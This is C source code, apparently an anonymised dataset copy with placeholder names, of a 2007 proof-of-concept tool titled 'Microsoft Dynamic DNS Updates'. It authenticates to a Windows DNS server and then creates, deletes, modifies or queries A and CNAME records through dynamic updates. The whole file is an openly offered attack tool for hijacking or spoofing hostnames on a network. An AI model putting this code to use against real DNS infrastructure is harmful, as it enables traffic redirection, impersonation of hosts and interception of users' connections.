
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_31__ TYPE_7__ ;
typedef struct TYPE_30__ TYPE_6__ ;
typedef struct TYPE_29__ TYPE_5__ ;
typedef struct TYPE_28__ TYPE_4__ ;
typedef struct TYPE_27__ TYPE_3__ ;
typedef struct TYPE_26__ TYPE_2__ ;
typedef struct TYPE_25__ TYPE_1__ ;
typedef struct TYPE_24__ TYPE_13__ ;
typedef struct TYPE_23__ TYPE_10__ ;


typedef int WORD ;
struct TYPE_31__ {int AddrCount; void** AddrArray; } ;
struct TYPE_28__ {void* IpAddress; } ;
struct TYPE_25__ {char* pNameHost; } ;
struct TYPE_29__ {TYPE_4__ A; TYPE_1__ Cname; } ;
struct TYPE_26__ {int Section; int CharSet; } ;
struct TYPE_24__ {TYPE_2__ S; } ;
struct TYPE_30__ {scalar_t__ UserLength; scalar_t__ wType; char* pName; int wDataLength; TYPE_5__ Data; int * pNext; TYPE_13__ Flags; } ;
struct TYPE_27__ {void* S_addr; } ;
struct TYPE_23__ {TYPE_3__ S_un; } ;
typedef TYPE_6__ SEC_WINNT_AUTH_IDENTITY_A ;
typedef int * PVOID ;
typedef TYPE_7__* PIP4_ARRAY ;
typedef TYPE_6__* PDNS_RECORDA ;
typedef TYPE_7__ IP4_ARRAY ;
typedef TYPE_10__ IN_ADDR ;
typedef int HANDLE ;
typedef int DWORD ;
typedef scalar_t__ DNS_STATUS ;
typedef TYPE_6__ DNS_RECORDA ;


 scalar_t__ VAR_0 ;
 char* VAR_1 ;
 scalar_t__ VAR_2 ;
 scalar_t__ VAR_3 ;
 scalar_t__ VAR_4 ;
 scalar_t__ VAR_5 ;
 int VAR_6 ;
 char* VAR_7 ;
 scalar_t__ FUNC_0 (int ,TYPE_6__*,int *) ;
 int VAR_8 ;
 int VAR_9 ;
 scalar_t__ FUNC_1 (TYPE_6__*,TYPE_6__*,int ,int ,TYPE_7__*,int *) ;
 TYPE_6__* FUNC_2 (char*,TYPE_7__*) ;
 int FUNC_3 (TYPE_6__*,int ) ;
 scalar_t__ FUNC_4 (TYPE_6__*,int ,int ,TYPE_7__*,int *) ;
 scalar_t__ VAR_10 ;
 int VAR_11 ;
 char* VAR_12 ;
 scalar_t__ VAR_13 ;
 TYPE_13__ VAR_14 ;
 char* VAR_15 ;
 char* VAR_16 ;
 scalar_t__ VAR_17 ;
 int FUNC_5 () ;
 void* FUNC_6 (char*) ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (TYPE_6__*,char,int) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char**) ;

int FUNC_12(int VAR_18, char *VAR_19[]) {

   HANDLE VAR_20;
   DNS_RECORDA *VAR_21;
   DNS_STATUS VAR_22;

   HANDLE VAR_23;
   DWORD VAR_24=VAR_6;
   PVOID VAR_25=((void*)0);
   IN_ADDR VAR_26;
   IP4_ARRAY *VAR_27=((void*)0);
   SEC_WINNT_AUTH_IDENTITY_A *VAR_28=((void*)0);
   WORD VAR_29;

   FUNC_9(" Microsoft Dynamic DNS Updates - Proof of Concept\n");
   FUNC_9(" http://www.514.es - (c) 2007 Andres Tarasco AcuÃ±a\n\n");
   if (VAR_18==1) FUNC_11(VAR_19);


   VAR_28 = (SEC_WINNT_AUTH_IDENTITY_A *)FUNC_7(sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   FUNC_8(VAR_28,'\0',sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   VAR_28->Flags=VAR_14;
   for(VAR_29=1;VAR_29<VAR_18;VAR_29++) {
      if ( VAR_19[VAR_29][0]=='-' ) {
         switch (VAR_19[VAR_29][1]) {
         case 's':
         case 'S':
            FUNC_10(VAR_16,VAR_19[VAR_29+1]);
            VAR_27=(PIP4_ARRAY)FUNC_7(sizeof(IP4_ARRAY));
            VAR_27->AddrCount=1;
            VAR_27->AddrArray[0]=FUNC_6(VAR_16);
            break;
         case 'D':
         case 'd':
            FUNC_10(VAR_7,VAR_19[VAR_29+1]);
            break;
         case 'q':
         case 'Q':
            FUNC_10(VAR_15,VAR_19[VAR_29+1]);
            break;
         case 'u':
         case 'U':
            FUNC_10(VAR_12,VAR_19[VAR_29+1]);
            break;
         case 'c':
         case 'C':
            FUNC_10(VAR_1,VAR_19[VAR_29+1]);
            if (VAR_12[0]=='\0') FUNC_10(VAR_12,"127.0.0.1");
            if (VAR_19[VAR_29][2]!='\0') {
               switch (VAR_19[VAR_29][2]) {
               case 'c': VAR_2=VAR_5;
                  break;
               case 'a': VAR_2=VAR_4;
                  break;
               }
            }
            break;
         default:
            FUNC_9("[-] Invalid argument: %s\n",VAR_19[VAR_29]);
            FUNC_11(VAR_19);
            break;
         }
         VAR_29++;
      } else FUNC_11(VAR_19);
   }

   FUNC_9("[+] Gathering Credentials..\n");

   if (VAR_28->UserLength==0) {
      VAR_22=FUNC_0(VAR_11,((void*)0),&VAR_23);
   } else {
      VAR_22=FUNC_0(VAR_11,VAR_28,&VAR_23);
   }

   if (VAR_22 == VAR_10) {
      if (VAR_0) {

         VAR_21=(PDNS_RECORDA)FUNC_7(sizeof(DNS_RECORDA));
         FUNC_8(VAR_21,'\0',sizeof(DNS_RECORDA));
         VAR_21->wType=VAR_2;
         if (VAR_2==VAR_5) {
            FUNC_9("[+] Creating DNS CName Record for %s (%s)\n",VAR_1,VAR_12);
            VAR_21->Data.Cname.pNameHost=VAR_12;
         } else {
            FUNC_9("[+] Creating DNS A Record for %s (%s)\n",VAR_1,VAR_12);
            VAR_21->Data.A.IpAddress=FUNC_6(VAR_12);
         }
         VAR_21->pName=VAR_1;
         VAR_21->wDataLength=4;
         VAR_21->Flags.S.Section=1;
         VAR_21->Flags.S.CharSet=VAR_8;
         VAR_21->pNext=((void*)0);

         VAR_22=FUNC_1(VAR_21,
            ((void*)0),
            VAR_24,
            VAR_23,
            VAR_27,
            ((void*)0));
         if (VAR_22 ==VAR_10) {
            FUNC_9("[+] Host Created. Rechecking Record...\n");
            FUNC_3(VAR_21,VAR_9);
            VAR_21=FUNC_2(VAR_1,VAR_27);
         } else {
            FUNC_9("[-] Error: Unable to create  %s (%i)\n",VAR_1,VAR_22);
         }
      } else if (VAR_3) {
         FUNC_9("[+] Trying to resolve Host: %s before deleting\n",VAR_7);
         VAR_21=FUNC_2(VAR_7,VAR_27);
         if (VAR_21!=((void*)0)) {
            FUNC_9("[+] Trying to Delete Record. Are You Sure? (Y/N)...");
            VAR_29=FUNC_5(); if (VAR_29!='y') return(-1);
            FUNC_9("[+] Deleting record %s\n",VAR_7);
            VAR_22=FUNC_1(((void*)0),
               VAR_21,
               VAR_24,
               VAR_23,
               VAR_27,
               ((void*)0));
            if (VAR_22 ==VAR_10) {
               FUNC_9("[+] Host Deleted. Rechecking Record %s...\n",VAR_7);
               FUNC_3(VAR_21,VAR_9);
               VAR_21=FUNC_2(VAR_7,VAR_27);
            } else {
               FUNC_9("[-] Error: Unable to Delete %s\n",VAR_7);
            }
         } else {
            FUNC_9("[-] Host %s not found\n",VAR_7);
         }

      } else if (VAR_17) {

         FUNC_9("[+] Trying to resolve Host: %s before updating\n",VAR_15);
         VAR_21=FUNC_2(VAR_15,VAR_27);
         if (VAR_21->wType==VAR_4 ) {
            FUNC_9("[+] Trying to update record. Are You Sure? (Y/N)...");
            VAR_29=FUNC_5(); if (VAR_29!='y') return(-1);
            VAR_21->Data.A.IpAddress=FUNC_6(VAR_12);
            VAR_26.S_un.S_addr = (VAR_21->Data.A.IpAddress);
            FUNC_9("[+] Trying to set ip address of the host %s to %s \n", VAR_15,VAR_12);
            FUNC_9("[+] Trying to Modify Record...\n");
            VAR_22=FUNC_4(VAR_21,
               VAR_24,
               VAR_23,
               VAR_27,
               ((void*)0));
            if (VAR_22 ==VAR_10) {
               FUNC_9("[+] Host Updated. Rechecking Record...\n");
               FUNC_3(VAR_21,VAR_9);
               VAR_21=FUNC_2(VAR_15,VAR_27);
            } else {
               FUNC_9("[-] Error: Unable to Delete %s\n",VAR_15);
            }

         } else {
            FUNC_9("[-] Unable to Update Record (Type %x)\n",VAR_21->wType);
            }
      } else if (VAR_13) {
         FUNC_9("[+] Query Information for host %s...\n",VAR_15);
         VAR_21=FUNC_2(VAR_15,VAR_27);
         FUNC_3(VAR_21,VAR_9);
      } else {
         FUNC_9("[-] Unknown Options\n");
         return(-1);
      }
   } else {
      FUNC_9("[-] Error Calling DnsAcquireContextHandle\n");
   }
   return (1);
}
